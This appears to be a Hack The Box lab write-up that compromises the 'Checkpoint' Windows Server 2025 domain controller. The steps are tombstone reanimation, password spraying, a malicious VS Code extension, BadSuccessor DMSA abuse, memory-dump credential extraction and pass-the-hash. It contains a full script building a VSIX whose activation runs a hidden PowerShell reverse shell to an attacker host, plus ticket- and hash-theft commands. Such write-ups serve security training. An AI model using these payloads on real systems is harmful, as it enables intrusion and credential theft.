# Checkpoint - Technical Penetration Testing Writeup

Hello everyone, this writeup details the complete exploitation process of the Checkpoint machine (an Active Directory environment). To ensure an in-depth technical perspective, I will focus on analyzing access control structures (ACL/DACL), Kerberos protocol mechanics, payload execution flows via VS Code extensions, and specifically the privilege escalation technique exploiting Delegated Managed Service Accounts (DMSA) on Windows Server 2025.

---

## 1. Initial Reconnaissance & Enumeration: Bypassing Default Protections

An initial `nmap` scan identified the target at `10.10.X.X` as a Domain Controller. Notably, the OS is recognized as **Windows Server 2025**. The SMB service is configured with `Message signing enabled and required` (SMB Signing Enforced), effectively neutralizing NTLM/SMB Relay attack vectors.

Armed with the initial credentials `alex.turner:Checkpoint2024!`, I proceeded to enumerate shared folders via the SMB protocol (port 445):

```bash
smbclient -L //10.10.X.X/ -U 'alex.turner' -p 'Checkpoint2024!'
```

The output revealed the following Shares:
```text
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DevDrop         Disk      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
        VMBackups       Disk
```

I dumped the `SYSVOL` directory to extract Group Policy Objects (GPO), aiming to find `Groups.xml` containing cpassword or sensitive configurations.
```bash
└─$ smbclient //10.10.X.X/SYSVOL -U 'alex.turner%Checkpoint2024!'
smb: \> cd checkpoint.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\
smb: \checkpoint.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> get Registry.pol
```
After parsing the `Registry.pol` file, no sensitive credential information was recovered.

Next, I queried the KDC (port 88) to perform AS-REP Roasting to retrieve TGTs for users with the `UF_DONT_REQUIRE_PREAUTH` configuration:
```bash
impacket-GetNPUsers checkpoint.htb/alex.turner:Checkpoint2024! -usersfile users.txt -dc-ip 10.10.X.X -format hashcat -outputfile asrep_hashes.txt
```
The KDC returned errors for all users, confirming that Kerberos Pre-Authentication is enabled by default for the entire domain.

**Technical Mindset:** When default configurations are secure, the remaining weak points often lie in custom ACLs (Access Control Lists) established by administrators. A detailed enumeration of the `alex.turner` DACL is required.

---

## 2. Active Directory ACL Analysis & Object Undeletion (Tombstone Reanimation)

Instead of using BloodHound, which might struggle with parsing LDAP queries on the new Server 2025 schema, I used `bloodyAD` to connect directly to LDAP (TCP/389) and query the `writable` attributes of the object:

```bash
bloodyad -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host dc01.checkpoint.htb get writable
```

The output returned a highly unusual Access Control Entry (ACE):
```text
distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE
```

**Technical Analysis:** 
The `alex.turner` account was assigned `GenericWrite` or `WriteProperty` rights over a Tombstone Object (a soft-deleted object moved to the `CN=Deleted Objects` container). 
In Active Directory, when an object is deleted, the `isDeleted` attribute is set to `TRUE`, and most other attributes are cleared (except SID, GUID). Because `alex.turner` has write permissions on this Tombstone Object, we can abuse the **Tombstone Reanimation** technique (object undeletion). Specifically, we can remove the `isDeleted` flag and move the object back to a valid OU by updating the `distinguishedName` attribute.

Executing the restoration via `bloodyAD`:
```bash
bloodyad -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host dc01.checkpoint.htb set restore "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
```

```text
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

The user `mark.davies` was resurrected in an Active state, but the `unicodePwd` attribute could not be changed due to Password Policy restrictions.

To bypass this, I applied a **Password Spraying** tactic using the password `Checkpoint2024!` (the company's default issued password, known from `alex.turner`) via the SMB protocol:
```bash
nxc smb 10.10.X.X -u users.txt -p 'Checkpoint2024!' --continue-on-success
```

The authentication result (NTLM Auth) returned SUCCESS for `mark.davies`:
```text
SMB         10.10.X.X    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
SMB         10.10.X.X    445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024!
```

---

## 3. Remote Code Execution via VS Code Extension (VSIX Payload)

Re-evaluating the access rights to the `DevDrop` share under the `mark.davies` context, I noticed this user possessed `WriteData/AddFile` permissions:
```bash
smbclient //10.10.X.X/DevDrop -U mark.davies%'Checkpoint2024!'
smb: \> ls
  .                                   D        0  Fri Jul 10 23:25:03 2026
```

Analyzing the `DevDrop` Share Comment: *VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0*.
This implies the server (or a scheduled task/user agent) is monitoring this directory to load and install `.vsix` files (Visual Studio Extensions). Inherently, a `.vsix` file is simply a standard ZIP archive containing a NodeJS package.

**VSIX Exploitation Logic:**
If we modify the `extension.js` file inside the `out/` directory, importing the NodeJS `child_process` module to spawn a `powershell` process connecting back to a listener, we can achieve execution. By defining `activationEvents: ["*"]` in `package.json`, our extension is forced to activate immediately upon the VS Code Engine loading the package.

To accomplish this, I referenced and customized a VSIX Payload creation script from the [trailofbits/vsix-zoo](https://github.com/trailofbits/vsix-zoo) repository:
```bash
#!/usr/bin/env bash
set -e

LHOST="${1:-10.10.X.X}"
LPORT="${2:-4444}"
NAME="rce-extension"
PUBLISHER="ecm3401"
VERSION="1.0.0"
OUTPUT="${NAME}-${VERSION}.vsix"
WORKDIR=$(mktemp -d)

# --- extension/out/extension.js (auto-execute reverse shell on activate) ---
mkdir -p "$WORKDIR/extension/out"

cat > "$WORKDIR/extension/out/extension.js" << 'JSEOF'
const net = require('net');
const cp = require('child_process');

function reverse_shell(host, port) {
    // PowerShell reverse shell (Windows)
    const ps_cmd = `powershell -NoP -NonI -W Hidden -Exec Bypass -C "$c=New-Object Net.Sockets.TCPClient('${host}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"`;

    cp.exec(ps_cmd, (err) => {});
}

function activate(context) {
    reverse_shell('HOST_PLACEHOLDER', PORT_PLACEHOLDER);
}
function deactivate() {}
module.exports = { activate, deactivate };
JSEOF

sed -i "s/HOST_PLACEHOLDER/$LHOST/g; s/PORT_PLACEHOLDER/$LPORT/g" "$WORKDIR/extension/out/extension.js"

# --- extension/package.json ---
cat > "$WORKDIR/extension/package.json" << JSONEOF
{
    "name": "$NAME",
    "publisher": "$PUBLISHER",
    "displayName": "VSIX RCE Payload",
    "version": "$VERSION",
    "engines": { "vscode": "^1.65.0" },
    "activationEvents": ["*"],
    "main": "./out/extension.js"
}
JSONEOF

# ... (create extension.vsixmanifest and [Content_Types].xml files) ...
cd "$WORKDIR"
zip -r "$OUTPUT" extension.vsixmanifest '[Content_Types].xml' extension/ >/dev/null
```

Uploading the payload to SMB:
```bash
smb: \> put rce-extension-1.0.0.vsix
```

The system's automation immediately loaded the file, triggering the `activate()` event in the JS code and calling the win32 API to spawn the `powershell.exe` process. The result was a Reverse Shell connecting back to the attacker workstation:
```text
➜  ~ nc -lnvp 4444
connect to [10.10.X.X] from (UNKNOWN) [10.10.X.X] 63076
PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks
```
Successfully retrieved `user.txt`.

---

## 4. Privilege Escalation: Exploiting Delegated Managed Service Accounts (DMSA) via BadSuccessor

Operating under the `ryan.brooks` context, I exported data into BloodHound to perform Pathfinding. The results revealed that `ryan.brooks` possessed **GenericWrite** rights over the `CN=svc_deploy` object.

**Technical Analysis (Technical Logic Gap):**
Normally, `GenericWrite` grants the ability to manipulate object attributes for Account Takeover, typically via:
1. **Shadow Credentials**: Overwriting the `msDS-KeyCredentialLink` attribute to authenticate via Kerberos PKINIT. However, this system **does not implement AD CS (Active Directory Certificate Services)**, so PKINIT authentication is non-functional.
2. **Resource-Based Constrained Delegation (RBCD)**: Requires writing to `msDS-AllowedToActOnBehalfOfOtherIdentity`. But attacking RBCD necessitates the right to create a Computer Account (condition `MachineAccountQuota > 0`). This was blocked on the system.

Confirming the Operating System:
```powershell
PS C:\Users\ryan.brooks\Desktop> Get-ADDomainController -Filter * | Select-Object Name, OperatingSystem, IPv4Address
DC01 Windows Server 2025 Standard 10.10.X.X
```

**Exploiting BadSuccessor (DMSA Impersonation):**
Windows Server 2025 introduced a new feature called **Delegated Managed Service Accounts (DMSA)** to improve upon gMSA. The DMSA mechanism relies on managing accounts via an Organizational Unit (OU).
A vulnerability (or misconfiguration) known as **BadSuccessor** allows an account with control over the OU containing DMSAs to create a malicious DMSA, link this DMSA to another target account, and trick the Key Distribution Center (KDC) into issuing a Ticket Granting Ticket (TGT) for the target.

Verifying via a PowerShell script, it was confirmed that `ryan.brooks` had rights (CreateChild/DeleteChild/WriteDACL) on the `DMSAHolder` OU:
```powershell
PS C:\Users\ryan.brooks\Desktop> .\Get-BadSuccessorOUPermissions.ps1
Identity               OUs
--------               ---
CHECKPOINT\ryan.brooks {OU=DMSAHolder,DC=checkpoint,DC=htb}
```

Exploitation workflow:
1. Request a TGT for the current session (`ryan.brooks`) into memory via GSS-API using Rubeus, then dump it as base64:
```powershell
PS C:\Users\ryan.brooks\Desktop> .\Rubeus.exe tgtdeleg /nowrap
...
[*] Extracted the service ticket session key from the ticket cache: u/dV9lNl8FGFPbfPTQzP/2pBTiMB3Aq95NOQzmI47ZU=
[*] base64(ticket.kirbi): doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRA...
```
*(This base64 was converted to a ccache file saved at `/tmp/ryan2.ccache` on the Kali machine).*

2. Use this TGT to execute the BadSuccessor attack via `bloodyAD`. This process creates a new DMSA object (`evilDMSA6$`) in `OU=DMSAHolder` and configures the successor attributes to trick the KDC into issuing a Kerberos ticket for the identity of `svc_deploy`:
```bash
bloodyad -k ccache=/tmp/ryan2.ccache -u ryan.brooks --dc-ip 10.10.X.X \
--host dc01.checkpoint.htb -d checkpoint.htb \
add badSuccessor evilDMSA6 -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
--ou "OU=DMSAHolder,DC=checkpoint,DC=htb"
```

The KDC Response output successfully returned the TGT of the target account (`svc_deploy`) and automatically saved it to a ccache file:
```text
[+] Creating DMSA evilDMSA6$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : evilDMSA6$
...
[+] dMSA TGT stored in ccache file evilDMSA6_3A.ccache
```

Next, applying the **Pass-the-Ticket (PtT)** technique using the freshly harvested TGT to authenticate with DC01's SMB service:
```bash
nxc smb dc01.checkpoint.htb -k --use-kcache --shares
```
The KDC granted a valid Service Ticket (ST) for `cifs/dc01.checkpoint.htb`, and the returned result showed read access to the `VMBackups` share:
```text
SMB         dc01.checkpoint.htb 445    DC01             [+] checkpoint.htb\evilDMSA6$ from ccache
...
SMB         dc01.checkpoint.htb 445    DC01             VMBackups       READ
```

Logging into the share via `smbclient` with the `-k` flag (Kerberos Auth), I successfully retrieved the `Windows Server 2019-Snapshot1.vmem` memory dump of another system:
```bash
smbclient //10.10.X.X/VMBackups -k
smb: \> cd "memory forensics"
smb: \memory forensics\> get "Windows Server 2019-Snapshot1.vmem"
```

The Memory Forensics data collection phase is complete, preparing the input data for offline analysis with the Volatility framework.

---

## 5. Memory Forensics & Domain Compromise (Root Flag)

The `Windows Server 2019-Snapshot1.vmem` file collected from the `VMBackups` share is a Physical Memory dump of a virtual server. To extract identity information (credentials) stored in memory, I conducted an offline analysis using the **Volatility 3** framework.

First, installing and setting up Volatility 3:
```bash
pipx install volatility3
VOL=/home/user/.local/share/pipx/venvs/volatility3/bin/vol
```

The core objective in Memory Forensics for hash extraction is to retrieve the loaded Registry Hives (`SAM`, `SYSTEM`, and `SECURITY`). I used the `windows.registry.hivelist.HiveList` plugin to locate and dump these hives into the `lsass_dump` directory (assuming the file was renamed to `snapshot.vmem` for brevity):
```bash
$VOL -f snapshot.vmem windows.registry.hivelist.HiveList
mkdir lsass_dump
$VOL -f snapshot.vmem \
-o lsass_dump \
windows.registry.hivelist.HiveList --dump
```

Once the hives were dumped to disk (with the memory offset address appended to the filename), I utilized `impacket-secretsdump` in `LOCAL` mode (offline file parsing mode) to decrypt and extract the NTLM hashes:
```bash
impacket-secretsdump \
-sam lsass_dump/registry.SAM.0xc30a3278e000.hive \
-system lsass_dump/registry.SYSTEM.0xc30a2fe38000.hive \
-security lsass_dump/registry.SECURITY.0xc30a32789000.hive \
LOCAL
```

The decryption of the SAM hive yielded the ultimate prize: the NTLM hash of the **Administrator** account. At this point, the Domain is officially and fully **Compromised**.

With just a few final commands, abusing the **Pass-the-Hash (PtH)** technique over SMB/WMI via `nxc` (NetExec), I connected directly to DC01 and executed a command to read the root flag on the `max.palmer` user's Desktop:
```bash
nxc smb dc01.checkpoint.htb -u Administrator -H $ADMIN_HASH

nxc smb dc01.checkpoint.htb \
-u Administrator \
-H $ADMIN_HASH \
-x 'type C:\Users\max.palmer\Desktop\root.txt' 
```
The root flag was successfully secured!

---

## 6. Lessons Learned (Technical Takeaways)

1. **Tombstone Objects Security is Critical:** Active Directory Retention Policies preserve deleted objects (Tombstones) for a specific duration. If ACLs (DACL) are not strictly configured on the `CN=Deleted Objects` container, an attacker with WriteProperty/GenericWrite permissions can easily exploit Tombstone Reanimation to resurrect and hijack forgotten accounts.
2. **Default Passwords Lead to Immediate Compromise:** The recovery of an account is only half the battle. Reusing a standard company password format (like `CompanyYear!`) enables attackers to trivially bypass account lockouts via Password Spraying, converting a revived account into an active threat.
3. **The Dangers of Unrestricted Automation (VS Code VSIX):** Granting AddFile/WriteData permissions to a directory actively monitored and automatically executed by engines like VS Code poses an immense risk. The NodeJS package loading mechanism (`package.json`) via `activationEvents` can be easily manipulated to spawn execution payloads (RCE) without user interaction.
4. **Modern AD Architectures Demand New Exploit Vectors:** Classic techniques like Shadow Credentials and RBCD remain highly relevant but fail when prerequisites (like AD CS PKI or MachineAccountQuota) are absent. Understanding modern authentication and delegation mechanisms, such as Delegated Managed Service Accounts (DMSA) introduced in Windows Server 2025, is crucial. The BadSuccessor misconfiguration illustrates how new features often introduce new attack paths.
5. **Memory Backups Are High-Value Targets:** Unencrypted memory dumps (like `.vmem` files) left in accessible network shares are a goldmine for attackers. Using memory forensics tools like Volatility, an adversary can extract loaded Registry Hives and dump domain-level credentials, leading directly to a total domain compromise.

---

### Tags
#HackTheBox #HTB #Checkpoint #ActiveDirectory #WindowsServer2025 #CyberSecurity #PenetrationTesting #Writeup #DMSA #BadSuccessor #Kerberos #MemoryForensics #Volatility3 #RCE #TombstoneReanimation #PassTheTicket #PassTheHash #RedTeaming #Checkpoint.htb
